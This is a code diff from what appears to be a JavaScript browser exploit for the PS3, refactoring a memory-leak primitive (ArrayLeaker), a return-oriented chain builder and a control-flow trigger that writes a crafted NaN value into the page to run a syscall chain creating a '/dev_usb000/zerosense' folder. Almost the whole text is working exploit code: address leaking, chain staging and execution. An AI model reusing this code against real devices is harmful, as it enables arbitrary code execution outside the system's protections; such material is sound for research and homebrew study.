@@ -61,20 +61,12 @@ var searcher = null;
 		offsets = Offsets.get(environment);
 
 		////////////////////
-
-		var buttonInit = document.getElementById("buttonInit");
-		buttonInit.addEventListener("click", () => init());
 		
-		var buttonCreateChain = document.getElementById("buttonCreateChain");
-		buttonCreateChain.addEventListener("click", () => createChain());
-		
-		var buttonExecuteChain = document.getElementById("buttonExecuteChain");
-		buttonExecuteChain.addEventListener("click", () => executeChain());
+		var buttonCreateFolder = document.getElementById("buttonCreateFolder");
+		buttonCreateFolder.addEventListener("click", () => createFolder());
 		
 		var buttonLogClear = document.getElementById("buttonLogClear");
 		buttonLogClear.addEventListener("click", () => logger.clear());
-		
-		buttonInit.focus();
 	} catch (e) {
 		if (environment.ps3) {
 			alert(e);
@@ -87,102 +79,155 @@ var searcher = null;
 
 var arrayLeaker = null;
 
-function init(step = 0, data = null) {	
+function needsInit() {
+	return arrayLeaker === null || !arrayLeaker.verify();
+}
+
+/**
+ * TODO: Change search to create and pass a promise, so we can use then() to chain logic
+ */
+function init(step = 0, data = null, callback = null) {
 	if (step === 0) {
-		logger.info("Initializing...");
-		step++;
-	}
-	
-	if (step === 1) {
 		arrayLeaker = new ArrayLeaker(memoryReader);
-		arrayLeaker.createArray(10, "Obey the moderator");
+		arrayLeaker.createArray(20, "Obey the Moderator");
 		
 		var searchStart = 0x80190000;
 		var searchEnd = 0x80600000;
 		searcher.startArray(searchStart, searchEnd - searchStart, arrayLeaker.getArray(), (data) => init(step + 1, data));
 	}
 	
-	if (step === 2) {
+	if (step === 1) {
 		if (data.match === null) {
-			logger.error("Failed to find ArrayLeaker array.");
+			return { success: false, fatal: true, step: step, message: "Failed to init ArrayLeaker." };
+		}
+		
+		logger.info(`Found ArrayLeaker array at 0x${data.match.toString(16)}`);
+		arrayLeaker.setAddress(data.match);
+		
+		step++;
+	}
+	
+	if (step === 2) {
+		createBuffers();
+		
+		step++;
+	}
+	
+	if (step === 3) {
+		setTimeout(callback);
+	}
+}
+
+var buffer = null, addrBuffer = null;
+
+function createBuffers() {
+	logger.info("Creating buffers...");
+	
+	var i = 0;
+	buffer = Util.ascii("gtmp") + Util.pad(0x1000);
+	arrayLeaker.setString(i, buffer);
+	addrBuffer = arrayLeaker.getStringAddress(i);
+	if (addrBuffer === null) {
+		logger.error("Failed to get buffer address.");
+		return;
+	}
+	addrBuffer += 4;
+	logger.info(`Found buffer at 0x${addrBuffer.toString(16)}`);
+	
+	logger.info("Created buffers.");
+}
+
+function execute(address) {
+	return new Promise((resolve) => {
+		logger.info(`Starting chain at 0x${address.toString(16)}`);
+		document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + address.toString(16));
+		return resolve();
+	});
+}
+
+function createFolder() {
+	logger.info("Creating folder...");
+	
+	/*var addrGtemp = 0xdeadbeef;
+	
+	var chain = new ChainBuilder(offsets, addrGtemp)
+		.create();
+		
+	console.log(Util.strhex(chain.getData()));
+	console.log(Util.strhex(chain.getChain()));
+	
+	chain.updateDataAddress(0x13370000);
+	
+	console.log(Util.strhex(chain.getData()));
+	console.log(Util.strhex(chain.getChain()));*/
+	
+	if (needsInit()) {
+		logger.info("Need to init first...");
+		init(0);
+		return;
+	}
+	
+	var path = Util.ascii("/dev_usb000/zerosense");
+	var result = mkdir(path).then((result) => {
+		if (result.code < 0) {
+			logger.error("Error while creating folder: " + result.message);
 			return;
 		}
 		
-		logger.info(`Found leakArray at 0x${data.match.toString(16)}`);
-		arrayLeaker.setAddress(data.match);
-		
-		logger.info("Initialized.");
-	}
+		logger.info(`Value: 0x${result.value.toString(16)}`);
+	});
 }
 
-var addrChainStart = null;
+function mkdir(strpath) {
+	var i = 10;
+	
+	var chain = new ChainBuilder(offsets, addrBuffer)
+		.addData("path", strpath)
+		.syscallR3Data(0x32B, "path", 0o700, 0, 0, 0, 0, 0, 0)
+		.storeR3Data("errno")
+		.create();
+	arrayLeaker.setString(i, chain.getData());
+	var addrChainData = arrayLeaker.getStringAddress(i);
+	if (addrChainData === null) {
+		return Promise.resolve({ code: -1, message: "Failed to get chain data address." });
+	}
+	logger.info(`Found chain data at 0x${addrChainData.toString(16)}`);
+	chain.updateDataAddress(addrChainData);
 
-function createChain() {
-	logger.info("Creating chain...");
-	
-	addrChainStart = null;
-	
-	var gtemp = Util.pad(0x1000);
-	arrayLeaker.setString(3, gtemp);
-	var addrGtemp = arrayLeaker.getStringAddress(3);
-	if (addrGtemp === null) {
-		logger.error("Failed to get gtemp address.");
-		return;
+	i++;
+	arrayLeaker.setString(i, chain.getChain());
+	var addrChainStack = arrayLeaker.getStringAddress(i);
+	if (addrChainStack === null) {
+		return Promise.resolve({ code: -1, message: "Failed to get chain stack address." });
 	}
-	logger.info(`Found gtemp at 0x${addrGtemp.toString(16)}`);
+	logger.info(`Found chain stack at 0x${addrChainStack.toString(16)}`);
+	var chainStackOffset = 0x4;
 	
-	var chain2 = new ChainBuilder(offsets).setGtemp(addrGtemp).syscall(0x188, 0x1004, 0xA, 0x1B6, 0, 0, 0, 0, 0).create();
-	arrayLeaker.setString(2, chain2);
-	var addrChain2 = arrayLeaker.getStringAddress(2);
-	if (addrChain2 === null) {
-		logger.error("Failed to get chain2 address.");
-		return;
+	i++;
+	var setup2 = ChainBuilder.setup2(addrChainStack + chainStackOffset);
+	arrayLeaker.setString(i, setup2);
+	var addrSetup2 = arrayLeaker.getStringAddress(i);
+	if (addrSetup2 === null) {
+		return Promise.resolve({ code: -1, message: "Failed to get setup2 address" });
 	}
-	logger.info(`Found chain2 at 0x${addrChain2.toString(16)}`);
+	logger.info(`Found setup2 at 0x${addrSetup2.toString(16)}`);
 	
-	var chain1 = ChainBuilder.setup2(addrChain2 + 4);
-	arrayLeaker.setString(1, chain1);
-	var addrChain1 = arrayLeaker.getStringAddress(1);
-	if (addrChain1 === null) {
-		logger.error("Failed to get chain1 address.");
-		return;
+	i++;
+	var setup1 = ChainBuilder.setup1(addrSetup2);
+	arrayLeaker.setString(i, setup1);
+	var addrSetup1 = arrayLeaker.getStringAddress(i);
+	if (addrSetup1 === null) {
+		return Promise.resolve({ code: -1, message: "Failed to get setup1 address." });
 	}
-	logger.info(`Found chain1 at 0x${addrChain1.toString(16)}`);
+	logger.info(`Found setup1 at 0x${addrSetup1.toString(16)}`);
 	
-	var chain0 = ChainBuilder.setup1(addrChain1 + 4);
-	arrayLeaker.setString(0, chain0);
-	var addrChain0 = arrayLeaker.getStringAddress(0);
-	if (addrChain0 === null) {
-		logger.error("Failed to get addrChain0 address.");
-		return;
-	}
-	logger.info(`Found chain0 at 0x${addrChain0.toString(16)}`);
-	
-	addrChainStart = addrChain0 + 4;
-	
+	var addrChainStart = addrSetup1;
 	logger.info(`Chain start at 0x${addrChainStart.toString(16)}`);
 	
-	logger.info("Created chain.");
-}
-
-function execute(addressChainStart, callback) {
-	setTimeout(() => {
-		logger.info(`Starting chain at 0x${addressChainStart.toString(16)}`);
-		document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + addressChainStart.toString(16) + ")");
-		callback();
-	}, 1);
-}
-
-function executeChain() {
-	logger.info("Execute chain...");
-	
-	if (addrChainStart === null) {
-		logger.error("addrChainStart is null.");
-		return;
-	}
-	
-	execute(addrChainStart, () => {
-		logger.info("Executed chain.");
+	return execute(addrChainStart).then(() => {
+		var str = chain.getData().substr(chain.getDataOffset("errno") / 2, 0x4 / 2);
+		var errno = Util.getint32(str);
+		return { code: 0, value: errno };
 	});
 }
 
